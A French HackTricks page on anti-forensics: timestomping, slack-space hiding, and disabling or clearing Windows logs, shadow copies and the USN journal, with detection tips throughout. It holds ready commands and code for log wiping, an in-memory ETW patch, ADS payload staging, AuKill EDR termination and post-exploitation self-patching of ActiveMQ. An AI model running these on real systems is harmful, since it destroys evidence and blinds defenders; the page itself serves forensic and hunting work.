# Techniques Anti-Forensiques

{{#include ../../banners/hacktricks-training.md}}

## Horodatages

Un attaquant peut être intéressé par **le changement des horodatages des fichiers** pour éviter d'être détecté.\
Il est possible de trouver les horodatages à l'intérieur du MFT dans les attributs `$STANDARD_INFORMATION` \_\_ et \_\_ `$FILE_NAME`.

Les deux attributs ont 4 horodatages : **Modification**, **accès**, **création**, et **modification du registre MFT** (MACE ou MACB).

**L'explorateur Windows** et d'autres outils affichent les informations de **`$STANDARD_INFORMATION`**.

### TimeStomp - Outil Anti-forensique

Cet outil **modifie** les informations d'horodatage à l'intérieur de **`$STANDARD_INFORMATION`** **mais** **pas** les informations à l'intérieur de **`$FILE_NAME`**. Par conséquent, il est possible d'**identifier** une **activité** **suspecte**.

### Usnjrnl

Le **Journal USN** (Journal de Numéro de Séquence de Mise à Jour) est une fonctionnalité du NTFS (système de fichiers Windows NT) qui suit les changements de volume. L'outil [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permet d'examiner ces changements.

![](<../../images/image (801).png>)

L'image précédente est la **sortie** affichée par l'**outil** où l'on peut observer que certains **changements ont été effectués** sur le fichier.

### $LogFile

**Tous les changements de métadonnées d'un système de fichiers sont enregistrés** dans un processus connu sous le nom de [journalisation anticipée](https://en.wikipedia.org/wiki/Write-ahead_logging). Les métadonnées enregistrées sont conservées dans un fichier nommé `**$LogFile**`, situé dans le répertoire racine d'un système de fichiers NTFS. Des outils comme [LogFileParser](https://github.com/jschicht/LogFileParser) peuvent être utilisés pour analyser ce fichier et identifier les changements.

![](<../../images/image (137).png>)

Encore une fois, dans la sortie de l'outil, il est possible de voir que **certains changements ont été effectués**.

En utilisant le même outil, il est possible d'identifier **à quel moment les horodatages ont été modifiés** :

![](<../../images/image (1089).png>)

- CTIME : Heure de création du fichier
- ATIME : Heure de modification du fichier
- MTIME : Modification du registre MFT du fichier
- RTIME : Heure d'accès du fichier

### Comparaison de `$STANDARD_INFORMATION` et `$FILE_NAME`

Une autre façon d'identifier des fichiers modifiés suspects serait de comparer le temps sur les deux attributs à la recherche de **disparités**.

### Nanosecondes

Les horodatages **NTFS** ont une **précision** de **100 nanosecondes**. Ainsi, trouver des fichiers avec des horodatages comme 2010-10-10 10:10:**00.000:0000 est très suspect**.

### SetMace - Outil Anti-forensique

Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, il est nécessaire qu'un OS en direct modifie ces informations.

## Masquage de Données

NFTS utilise un cluster et la taille minimale d'information. Cela signifie que si un fichier occupe et utilise un cluster et demi, la **moitié restante ne sera jamais utilisée** jusqu'à ce que le fichier soit supprimé. Il est donc possible de **cacher des données dans cet espace de remplissage**.

Il existe des outils comme slacker qui permettent de cacher des données dans cet espace "caché". Cependant, une analyse du `$logfile` et du `$usnjrnl` peut montrer que certaines données ont été ajoutées :

![](<../../images/image (1060).png>)

Il est alors possible de récupérer l'espace de remplissage en utilisant des outils comme FTK Imager. Notez que ce type d'outil peut sauvegarder le contenu obfusqué ou même chiffré.

## UsbKill

C'est un outil qui **éteindra l'ordinateur si un changement dans les ports USB** est détecté.\
Une façon de le découvrir serait d'inspecter les processus en cours et de **réviser chaque script python en cours d'exécution**.

## Distributions Linux Live

Ces distributions sont **exécutées dans la mémoire RAM**. La seule façon de les détecter est **si le système de fichiers NTFS est monté avec des permissions d'écriture**. S'il est monté uniquement avec des permissions de lecture, il ne sera pas possible de détecter l'intrusion.

## Suppression Sécurisée

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Configuration de Windows

Il est possible de désactiver plusieurs méthodes de journalisation de Windows pour rendre l'enquête d'analyse forensique beaucoup plus difficile.

### Désactiver les Horodatages - UserAssist

C'est une clé de registre qui maintient les dates et heures auxquelles chaque exécutable a été exécuté par l'utilisateur.

Désactiver UserAssist nécessite deux étapes :

1. Définir deux clés de registre, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` et `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, toutes deux à zéro pour signaler que nous voulons désactiver UserAssist.
2. Effacer vos sous-arbres de registre qui ressemblent à `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Désactiver les Horodatages - Prefetch

Cela enregistrera des informations sur les applications exécutées dans le but d'améliorer les performances du système Windows. Cependant, cela peut également être utile pour les pratiques d'analyse forensique.

- Exécutez `regedit`
- Sélectionnez le chemin de fichier `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Cliquez avec le bouton droit sur `EnablePrefetcher` et `EnableSuperfetch`
- Sélectionnez Modifier sur chacun d'eux pour changer la valeur de 1 (ou 3) à 0
- Redémarrez

### Désactiver les Horodatages - Dernière Heure d'Accès

Chaque fois qu'un dossier est ouvert à partir d'un volume NTFS sur un serveur Windows NT, le système prend le temps de **mettre à jour un champ d'horodatage sur chaque dossier répertorié**, appelé l'heure de dernier accès. Sur un volume NTFS très utilisé, cela peut affecter les performances.

1. Ouvrez l'Éditeur de Registre (Regedit.exe).
2. Parcourez `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Recherchez `NtfsDisableLastAccessUpdate`. S'il n'existe pas, ajoutez ce DWORD et définissez sa valeur à 1, ce qui désactivera le processus.
4. Fermez l'Éditeur de Registre et redémarrez le serveur.

### Supprimer l'Historique USB

Toutes les **Entrées de Périphériques USB** sont stockées dans le Registre Windows sous la clé de registre **USBSTOR** qui contient des sous-clés créées chaque fois que vous branchez un périphérique USB sur votre PC ou ordinateur portable. Vous pouvez trouver cette clé ici `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **En supprimant cela**, vous supprimerez l'historique USB.\
Vous pouvez également utiliser l'outil [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) pour vous assurer que vous les avez supprimés (et pour les supprimer).

Un autre fichier qui sauvegarde des informations sur les USB est le fichier `setupapi.dev.log` à l'intérieur de `C:\Windows\INF`. Cela devrait également être supprimé.

### Désactiver les Copies de Sécurité

**Lister** les copies de sécurité avec `vssadmin list shadowstorage`\
**Les supprimer** en exécutant `vssadmin delete shadow`

Vous pouvez également les supprimer via l'interface graphique en suivant les étapes proposées dans [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Pour désactiver les copies de sécurité [étapes à partir d'ici](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Ouvrez le programme Services en tapant "services" dans la zone de recherche après avoir cliqué sur le bouton de démarrage Windows.
2. Dans la liste, trouvez "Volume Shadow Copy", sélectionnez-le, puis accédez aux Propriétés en cliquant avec le bouton droit.
3. Choisissez Désactivé dans le menu déroulant "Type de démarrage", puis confirmez le changement en cliquant sur Appliquer et OK.

Il est également possible de modifier la configuration des fichiers qui vont être copiés dans la copie de sécurité dans le registre `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Écraser les fichiers supprimés

- Vous pouvez utiliser un **outil Windows** : `cipher /w:C` Cela indiquera à cipher de supprimer toutes les données de l'espace disque inutilisé disponible à l'intérieur du lecteur C.
- Vous pouvez également utiliser des outils comme [**Eraser**](https://eraser.heidi.ie)

### Supprimer les journaux d'événements Windows

- Windows + R --> eventvwr.msc --> Développez "Journaux Windows" --> Cliquez avec le bouton droit sur chaque catégorie et sélectionnez "Effacer le journal"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Désactiver les journaux d'événements Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Dans la section des services, désactivez le service "Journal des événements Windows"
- `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`

### Désactiver $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Journalisation Avancée & Manipulation de Trace (2023-2025)

### Journalisation des ScriptBlocks/Modules PowerShell

Les versions récentes de Windows 10/11 et Windows Server conservent des **artéfacts forensiques PowerShell riches** sous
`Microsoft-Windows-PowerShell/Operational` (événements 4104/4105/4106).
Les attaquants peuvent les désactiver ou les effacer à la volée :
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Les défenseurs devraient surveiller les modifications apportées à ces clés de registre et la suppression en grande quantité des événements PowerShell.

### Patch ETW (Event Tracing for Windows)

Les produits de sécurité des points de terminaison s'appuient fortement sur ETW. Une méthode d'évasion populaire en 2024 consiste à patcher `ntdll!EtwEventWrite`/`EtwEventWriteFull` en mémoire afin que chaque appel ETW renvoie `STATUS_SUCCESS` sans émettre l'événement :
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (e.g. `EtwTiSwallow`) implémentent la même primitive en PowerShell ou C++.  
Parce que le patch est **local au processus**, les EDRs fonctionnant dans d'autres processus peuvent le manquer.  
Détection : comparer `ntdll` en mémoire vs. sur disque, ou intercepter avant le mode utilisateur.

### Renaissance des Flux de Données Alternatifs (ADS)

Des campagnes de malware en 2023 (e.g. **FIN12** loaders) ont été observées mettant en scène des binaires de deuxième étape à l'intérieur des ADS pour rester hors de vue des scanners traditionnels :
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Énumérez les flux avec `dir /R`, `Get-Item -Stream *`, ou Sysinternals `streams64.exe`. Copier le fichier hôte vers FAT/exFAT ou via SMB supprimera le flux caché et peut être utilisé par les enquêteurs pour récupérer la charge utile.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver est désormais couramment utilisé pour **anti-forensics** dans les intrusions par ransomware. L'outil open-source **AuKill** charge un pilote signé mais vulnérable (`procexp152.sys`) pour suspendre ou terminer les capteurs EDR et forensiques **avant le chiffrement et la destruction des journaux** :
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Le pilote est ensuite supprimé, laissant des artefacts minimes.  
Atténuations : activer la liste de blocage des pilotes vulnérables de Microsoft (HVCI/SAC) et alerter sur la création de services du noyau à partir de chemins modifiables par l'utilisateur.

---

## Anti-Forensique Linux : Auto-correction et Cloud C2 (2023–2025)

### Auto-correction des services compromis pour réduire la détection (Linux)  
Les adversaires "s'auto-corrigent" de plus en plus un service juste après l'avoir exploité pour à la fois prévenir la ré-exploitation et supprimer les détections basées sur des vulnérabilités. L'idée est de remplacer les composants vulnérables par les derniers binaires/JARs légitimes en amont, de sorte que les scanners rapportent l'hôte comme corrigé tout en maintenant la persistance et le C2.

Exemple : Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
- Après l'exploitation, les attaquants ont récupéré des JARs légitimes depuis Maven Central (repo1.maven.org), ont supprimé les JARs vulnérables dans l'installation d'ActiveMQ et ont redémarré le courtier.  
- Cela a fermé le RCE initial tout en maintenant d'autres points d'ancrage (cron, modifications de configuration SSH, implants C2 séparés).

Exemple opérationnel (illustratif)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting tips
- Examine les répertoires de services pour des remplacements de binaire/JAR non planifiés :
- Debian/Ubuntu : `dpkg -V activemq` et comparez les hachages/chemins de fichiers avec les miroirs de dépôt.
- RHEL/CentOS : `rpm -Va 'activemq*'`
- Recherchez les versions JAR présentes sur le disque qui ne sont pas détenues par le gestionnaire de paquets, ou des liens symboliques mis à jour hors bande.
- Chronologie : `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` pour corréler ctime/mtime avec la fenêtre de compromission.
- Historique de shell/télémetrie de processus : preuves de `curl`/`wget` vers `repo1.maven.org` ou d'autres CDN d'artefacts immédiatement après l'exploitation initiale.
- Gestion des changements : validez qui a appliqué le "patch" et pourquoi, pas seulement qu'une version corrigée est présente.

### Cloud‑service C2 avec des jetons porteurs et des stagers anti-analyse
Le savoir-faire observé combinait plusieurs chemins C2 à long terme et un emballage anti-analyse :
- Chargeurs ELF PyInstaller protégés par mot de passe pour entraver le sandboxing et l'analyse statique (par exemple, PYZ chiffré, extraction temporaire sous `/_MEI*`).
- Indicateurs : hits `strings` tels que `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefacts d'exécution : extraction vers `/tmp/_MEI*` ou chemins personnalisés `--runtime-tmpdir`.
- C2 soutenu par Dropbox utilisant des jetons OAuth Bearer codés en dur
- Marqueurs réseau : `api.dropboxapi.com` / `content.dropboxapi.com` avec `Authorization: Bearer <token>`.
- Chasser dans les proxy/NetFlow/Zeek/Suricata pour des HTTPS sortants vers des domaines Dropbox à partir de charges de travail serveur qui ne synchronisent normalement pas de fichiers.
- C2 parallèle/de secours via tunneling (par exemple, Cloudflare Tunnel `cloudflared`), gardant le contrôle si un canal est bloqué.
- IOCs d'hôte : processus/unité `cloudflared`, configuration à `~/.cloudflared/*.json`, sortant 443 vers les bords de Cloudflare.

### Persistance et "rollback de durcissement" pour maintenir l'accès (exemples Linux)
Les attaquants associent fréquemment auto-correction avec des chemins d'accès durables :
- Cron/Anacron : modifications du stub `0anacron` dans chaque répertoire `/etc/cron.*/` pour une exécution périodique.
- Chasser :
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rétrogradation de durcissement de la configuration SSH : activation des connexions root et modification des shells par défaut pour les comptes à faible privilège.
- Chasser l'activation de la connexion root :
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# valeurs de drapeau comme "yes" ou paramètres trop permissifs
```
- Chasser les shells interactifs suspects sur les comptes système (par exemple, `games`) :
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Artefacts de balise aléatoires et de noms courts (8 caractères alphabétiques) déposés sur le disque qui contactent également le C2 cloud :
- Chasser :
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Les défenseurs devraient corréler ces artefacts avec l'exposition externe et les événements de patch de service pour découvrir l'auto-rémédiation anti-forensique utilisée pour cacher l'exploitation initiale.

## References

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Mars 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Juin 2024)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
